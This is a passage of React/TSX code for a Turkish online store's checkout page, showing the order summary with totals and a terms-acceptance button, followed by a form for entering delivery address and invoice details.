          <div className="bg-white rounded-lg sm:rounded-xl shadow-lg p-4 sm:p-6 h-fit md:sticky md:top-20">
            <h2 className="text-xl font-black text-gray-900 mb-4">Sipariş Özeti</h2>
            
            {/* Ürün Listesi */}
            {cartItems.length > 0 && (
              <div className="mb-4 space-y-2">
                {cartItems.map((item) => (
                  <div key={item.productId} className="flex items-center gap-3 p-2 bg-gray-50 rounded-lg">
                    <div className="relative w-16 h-16 bg-white rounded-lg overflow-hidden flex-shrink-0 flex items-center justify-center p-1">
                      <ProductImage
                        src={item.image}
                        alt={item.name}
                        className="max-w-full max-h-full w-auto h-auto object-contain"
                        fallback={
                          <div className="w-full h-full flex items-center justify-center">
                            <span className="text-xl">📦</span>
                          </div>
                        }
                      />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-semibold text-gray-900 text-sm truncate">{item.name}</p>
                      <p className="text-xs text-gray-600">Adet: {item.quantity}</p>
                      <p className="text-sm font-black text-a101-teal">
                        ₺{(item.price * item.quantity).toLocaleString('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            )}
            
            <div className="space-y-3 mb-6">
              <div className="flex justify-between text-gray-700">
                <span className="font-semibold">Ürün Tutarı</span>
                <span className="font-black">₺{subtotal.toLocaleString('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
              </div>
              <div className="flex justify-between text-gray-700">
                <span className="font-semibold">Kargo</span>
                <span className="font-black text-green-600">Ücretsiz</span>
              </div>
              <div className="border-t-2 border-gray-200 pt-3">
                <div className="flex justify-between text-xl font-black text-gray-900">
                  <span>Toplam</span>
                  <span>₺{total.toLocaleString('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
              </div>
            </div>

            {/* Ön Bilgilendirme Formu - Modern Mobile Design */}
            <div className="mb-4 sm:mb-5 md:mb-6">
              <button
                type="button"
                onClick={() => setAcceptedTerms(!acceptedTerms)}
                className={`w-full p-3 sm:p-3.5 md:p-4 rounded-lg border-2 transition-all duration-200 touch-manipulation min-h-[56px] sm:min-h-[60px] md:min-h-[64px] flex items-center justify-center gap-2 sm:gap-2.5 md:gap-3 ${
                  acceptedTerms
                    ? 'bg-a101-teal/10 border-a101-teal shadow-md'
                    : 'bg-gray-50 border-gray-300 hover:border-a101-teal/50 hover:bg-gray-100 active:bg-gray-200'
                }`}
              >
                <div className={`w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 rounded border-2 flex items-center justify-center flex-shrink-0 transition-all duration-200 ${
                  acceptedTerms
                    ? 'bg-a101-teal border-a101-teal'
                    : 'bg-white border-gray-400'
                }`}>
                  {acceptedTerms && (
                    <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 md:w-5 md:h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  )}
                </div>
                <span className={`text-xs sm:text-sm md:text-base font-semibold leading-[1.4] text-left flex-1 ${
                  acceptedTerms ? 'text-a101-teal' : 'text-gray-700'
                }`}>
                  Ön bilgilendirme formunu okudum ve kabul ediyorum
                </span>
              </button>
            </div>

            <button
              type="submit"
              className="w-full bg-a101-lightBlue hover:bg-a101-teal active:bg-a101-tealLight text-white py-3 sm:py-4 md:py-5 rounded-lg font-black text-base sm:text-lg md:text-xl transition-all duration-300 shadow-lg hover:shadow-xl active:shadow-md transform hover:scale-[1.02] active:scale-[0.98] touch-manipulation min-h-[52px] sm:min-h-[56px] md:min-h-[60px] flex items-center justify-center"
            >
              Siparişi Tamamla ve Ödemeye Geç
            </button>
          </div>
        </form>
      </main>

      <StoreFooter />
      <BottomNav />
    </div>
  );
}

// AddressForm Component (Account sayfasından alındı)
function AddressForm({ onClose, onSave }: { onClose: () => void; onSave: (address: any) => void }) {
  const [addressType, setAddressType] = useState<'Ev' | 'İş' | 'Diğer'>('Ev');
  const [formData, setFormData] = useState({
    title: '',
    city: '',
    cityId: 0,
    district: '',
    districtId: 0,
    neighborhood: '',
    neighborhoodId: 0,
    street: '',
    buildingNo: '',
    floor: '',
    apartmentNo: '',
    description: '',
    name: '',
    surname: '',
    invoiceType: 'Bireysel',
    companyName: '',
    taxNumber: '',
    taxOffice: '',
    eInvoice: false,
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSave({
      ...formData,
      type: addressType,
    });
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Address Type */}
      <div>
        <div className="flex gap-3">
          <button
            type="button"
            onClick={() => setAddressType('Ev')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg border-2 transition-all ${
              addressType === 'Ev'
                ? 'bg-a101-teal/10 border-a101-teal'
                : 'bg-white border-gray-300'
            }`}
          >
            <span className="text-2xl">🏠</span>
            <span className="font-semibold">Ev</span>
          </button>
          <button
            type="button"
            onClick={() => setAddressType('İş')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg border-2 transition-all ${
              addressType === 'İş'
                ? 'bg-a101-teal/10 border-a101-teal'
                : 'bg-white border-gray-300'
            }`}
          >
            <span className="text-2xl">🏢</span>
            <span className="font-semibold">İş</span>
          </button>
          <button
            type="button"
            onClick={() => setAddressType('Diğer')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg border-2 transition-all ${
              addressType === 'Diğer'
                ? 'bg-a101-teal/10 border-a101-teal'
                : 'bg-white border-gray-300'
            }`}
          >
            <span className="text-2xl">📍</span>
            <span className="font-semibold">Diğer</span>
          </button>
        </div>
      </div>

      {/* Info Banner */}
      <div className="bg-a101-teal/10 rounded-lg p-4 flex items-start gap-3">
        <span className="text-a101-teal text-xl">ℹ</span>
        <p className="text-sm text-gray-700">
          Lütfen adres bilgilerinde hata olup olmadığını kontrol et.
        </p>
      </div>

      {/* Address Title */}
      <div>
        <label className="block text-sm font-semibold text-gray-700 mb-2">
          Adres Başlığı <span className="text-red-500">*</span>
        </label>
        <input
          type="text"
          value={formData.title}
          onChange={(e) => setFormData({ ...formData, title: e.target.value })}
          placeholder="Ev Adresim"
          required
          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
        />
      </div>

      {/* Address Selector */}
      <div>
        <AddressSelector
          onAddressChange={(address) => {
            setFormData({
              ...formData,
              city: address.city,
              cityId: address.cityId,
              district: address.district,
              districtId: address.districtId,
              neighborhood: address.neighborhood,
              neighborhoodId: address.neighborhoodId,
            });
          }}
        />
      </div>

      {/* Street */}
      <div>
        <label className="block text-sm font-semibold text-gray-700 mb-2">
          Cadde, Sokak, Site/Bina Adı <span className="text-red-500">*</span>
        </label>
        <input
          type="text"
          value={formData.street}
          onChange={(e) => setFormData({ ...formData, street: e.target.value })}
          placeholder="Cadde, Sokak, Site/Bina Adı*"
          required
          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
        />
      </div>

      {/* Building, Floor, Apartment */}
      <div className="grid sm:grid-cols-3 gap-4">
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            Bina No <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={formData.buildingNo}
            onChange={(e) => setFormData({ ...formData, buildingNo: e.target.value })}
            required
            className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            Kat <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={formData.floor}
            onChange={(e) => setFormData({ ...formData, floor: e.target.value })}
            required
            className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            Daire No <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={formData.apartmentNo}
            onChange={(e) => setFormData({ ...formData, apartmentNo: e.target.value })}
            required
            className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
          />
        </div>
      </div>

      {/* Description */}
      <div>
        <label className="block text-sm font-semibold text-gray-700 mb-2">Adres Tarifi</label>
        <textarea
          value={formData.description}
          onChange={(e) => setFormData({ ...formData, description: e.target.value })}
          rows={3}
          className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent resize-none"
        />
      </div>

      {/* Name and Surname */}
      <div className="grid sm:grid-cols-2 gap-4">
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            Ad <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={formData.name}
            onChange={(e) => setFormData({ ...formData, name: e.target.value })}
            required
            className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">
            Soyad <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={formData.surname}
            onChange={(e) => setFormData({ ...formData, surname: e.target.value })}
            required
            className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
          />
        </div>
      </div>

      {/* Invoice Section */}
      <div>
        <h3 className="text-lg font-bold text-gray-900 mb-4">Fatura</h3>
        <div className="flex gap-4 mb-4">
          <label className="flex items-center space-x-2 cursor-pointer">
            <input
              type="radio"
              name="invoiceType"
              value="Bireysel"
              checked={formData.invoiceType === 'Bireysel'}
              onChange={(e) => setFormData({ ...formData, invoiceType: e.target.value })}
              className="w-4 h-4 text-a101-teal focus:ring-a101-teal"
            />
            <span>Bireysel</span>
          </label>
          <label className="flex items-center space-x-2 cursor-pointer">
            <input
              type="radio"
              name="invoiceType"
              value="Kurumsal"
              checked={formData.invoiceType === 'Kurumsal'}
              onChange={(e) => setFormData({ ...formData, invoiceType: e.target.value })}
              className="w-4 h-4 text-a101-teal focus:ring-a101-teal"
            />
            <span>Kurumsal</span>
          </label>
        </div>

        {formData.invoiceType === 'Kurumsal' && (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Firma Adı <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                value={formData.companyName}
                onChange={(e) => setFormData({ ...formData, companyName: e.target.value })}
                required={formData.invoiceType === 'Kurumsal'}
                className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Vergi Numarası (Şahıs İçin TCKN) <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                value={formData.taxNumber}
                onChange={(e) => setFormData({ ...formData, taxNumber: e.target.value })}
                required={formData.invoiceType === 'Kurumsal'}
                className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                Vergi Dairesi <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                value={formData.taxOffice}
                onChange={(e) => setFormData({ ...formData, taxOffice: e.target.value })}
                required={formData.invoiceType === 'Kurumsal'}
                className="w-full px-4 py-2.5 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-a101-teal focus:border-transparent"
              />
            </div>
            <label className="flex items-center space-x-2 cursor-pointer">
              <input
                type="checkbox"
                checked={formData.eInvoice}
                onChange={(e) => setFormData({ ...formData, eInvoice: e.target.checked })}
                className="w-4 h-4 text-a101-teal focus:ring-a101-teal"
              />
              <span className="text-sm text-gray-700">E-fatura Mükellefi</span>
            </label>
          </div>
        )}
      </div>

      {/* Buttons */}
      <div className="flex gap-3">
        <button
          type="button"
          onClick={onClose}
          className="flex-1 px-4 sm:px-6 py-3 sm:py-4 md:py-4 border-2 border-gray-300 rounded-lg font-semibold text-sm sm:text-base md:text-lg text-gray-700 hover:bg-gray-50 active:bg-gray-100 transition-all duration-300 touch-manipulation min-h-[52px] sm:min-h-[56px] md:min-h-[60px] flex items-center justify-center"
        >
          İptal
        </button>
        <button
          type="submit"
          className="flex-1 px-4 sm:px-6 py-3 sm:py-4 md:py-4 bg-a101-teal hover:bg-a101-tealLight active:bg-a101-teal text-white rounded-lg font-bold text-sm sm:text-base md:text-lg transition-all duration-300 shadow-lg hover:shadow-xl active:shadow-md transform hover:scale-[1.01] active:scale-[0.99] touch-manipulation min-h-[52px] sm:min-h-[56px] md:min-h-[60px] flex items-center justify-center"
        >
          Kaydet
        </button>
      </div>
    </form>
  );
}

